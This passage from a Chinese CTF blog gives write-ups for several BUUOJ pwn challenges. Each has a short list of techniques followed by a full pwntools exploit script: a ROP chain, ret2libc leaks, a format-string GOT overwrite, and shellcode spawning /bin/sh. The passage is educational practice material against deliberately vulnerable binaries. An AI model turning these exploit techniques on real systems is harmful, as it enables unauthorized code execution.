class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h2 id="picoctf-2018-can-you-gets-me"><a href="#picoctf-2018-can-you-gets-me" class="headerlink" title="picoctf_2018_can_you_gets_me"></a>picoctf_2018_can_you_gets_me</h2><p>（易）考点：</p><ul><li>栈溢出</li><li>静态编译</li></ul><p>ropchain一把梭</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">32</span></span><br><span class="line">challenge = <span class="string">&quot;./PicoCTF_2018_can-you-gets-me&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    p = <span class="number">0x1c</span> * <span class="string">b&#x27;a&#x27;</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">    p += <span class="string">b&#x27;/bin&#x27;</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">    p += <span class="string">b&#x27;//sh&#x27;</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de955</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806cc25</span>) <span class="comment"># int 0x80</span></span><br><span class="line">    sl(p)</span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28408</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">pau   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print &#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h2 id="axb-2019-brop64"><a href="#axb-2019-brop64" class="headerlink" title="axb_2019_brop64"></a>axb_2019_brop64</h2><p>（易）考点：</p><ul><li>栈溢出</li><li>ret2libc</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;axb_2019_brop64&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;../libc-2.23.so&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    ru(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">    pop_rdi_ret = <span class="number">0x0000000000400963</span></span><br><span class="line">    func = <span class="number">0x400845</span></span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0xD8</span> + p64(pop_rdi_ret) + p64(elf.got[<span class="string">&quot;read&quot;</span>]) + p64(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p64(func)</span><br><span class="line">    sd(payload)</span><br><span class="line">    leak = uu64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:]) - libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">    echo(<span class="string">&quot;libc base:&quot;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">    libc.address = leak</span><br><span class="line">    echo(<span class="string">&quot;/bin/sh:&quot;</span> + <span class="built_in">hex</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()))</span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0xD8</span> + p64(pop_rdi_ret) + p64(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()) + p64(libc.sym[<span class="string">&quot;system&quot;</span>]) + p64(<span class="number">0xdeadbeef</span>) </span><br><span class="line">    sd(payload)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29520</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print axb_2019_brop64&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h2 id="wdb-2018-2nd-easyfmt"><a href="#wdb-2018-2nd-easyfmt" class="headerlink" title="wdb_2018_2nd_easyfmt"></a>wdb_2018_2nd_easyfmt</h2><p>（易）考点：</p><ul><li>循环32位格式化字符串</li></ul><p>pwntools一把梭</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">32</span></span><br><span class="line">challenge = <span class="string">&quot;./wdb_2018_2nd_easyfmt.1&quot;</span></span><br><span class="line"><span class="comment"># libc_path = &#x27;/glibc/2.23-0ubuntu11.3_i386/libc-2.23.so&#x27;</span></span><br><span class="line">libc_path = <span class="string">&quot;../libc-2.23_32.so&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    ru(<span class="string">&quot;Do you know repeater?&quot;</span>)</span><br><span class="line">    sd(<span class="string">&quot;%35$p&quot;</span>)</span><br><span class="line">    ru(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">    leak = <span class="built_in">int</span>(re(<span class="number">8</span>, <span class="number">0</span>), base = <span class="number">16</span>) - <span class="number">247</span> - libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line">    echo(<span class="string">&quot;leak：&quot;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">    payload = fmtstr_payload(<span class="number">6</span>, &#123;elf.got[<span class="string">&quot;printf&quot;</span>]:leak + libc.sym[<span class="string">&quot;system&quot;</span>]&#125;)</span><br><span class="line">    sd(payload)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27749</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h2 id="x-ctf-b0verfl0w"><a href="#x-ctf-b0verfl0w" class="headerlink" title="x_ctf_b0verfl0w"></a>x_ctf_b0verfl0w</h2><p>（较易）考点：</p><ul><li>手写shellcode</li><li>栈溢出</li></ul><p>有个hint函数，里面有条jmp esp指令</p><p>栈空间太小，需要手写shellcode，然后ret地址改为jmp esp的gadget（开RWX了）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">32</span></span><br><span class="line">challenge = <span class="string">&quot;./b0verfl0w&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">    shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    push edx</span></span><br><span class="line"><span class="string">    push 0x68732f2f</span></span><br><span class="line"><span class="string">    push 0x6e69622f</span></span><br><span class="line"><span class="string">    mov ebx,esp</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    mov al,0xB</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload = asm(shellcode)</span><br><span class="line">    echo(<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    payload = payload.ljust(<span class="number">0x24</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    payload += p32(<span class="number">0x8048504</span>) + asm(<span class="string">&quot;sub esp,0x28;jmp esp&quot;</span>)</span><br><span class="line">    sl(payload)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26603</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h2 id="cmcc-pwnme1"><a href="#cmcc-pwnme1" class="headerlink" title="cmcc_pwnme1"></a>cmcc_pwnme1</h2><p>（易）考点：</p><ul><li>栈溢出，ret2libc</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./pwnme1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    ru(<span class="string">&quot;&gt;&gt; 6. Exit&quot;</span>)</span><br><span class="line">    sl(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">    ru(<span class="string">&quot;Please input the name of fruit:&quot;</span>)</span><br><span class="line">    payload = <span class="number">0xA8</span> * <span class="string">b&#x27;a&#x27;</span> + p32(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p32(<span class="number">0x08048624</span>) + p32(elf.got[<span class="string">&quot;puts&quot;</span>])</span><br><span class="line">    sl(payload)</span><br><span class="line">    libc = ELF(<span class="string">&quot;../libc-2.23_32.so&quot;</span>)</span><br><span class="line">    leak = uu32(ru(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:]) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">    payload = <span class="number">0xA8</span> * <span class="string">b&#x27;a&#x27;</span> + p32(leak + libc.sym[<span class="string">&quot;system&quot;</span>]) + p32(<span class="number">0x08048624</span>) + p32(leak + libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__())</span><br><span class="line">    sl(payload)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26780</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : 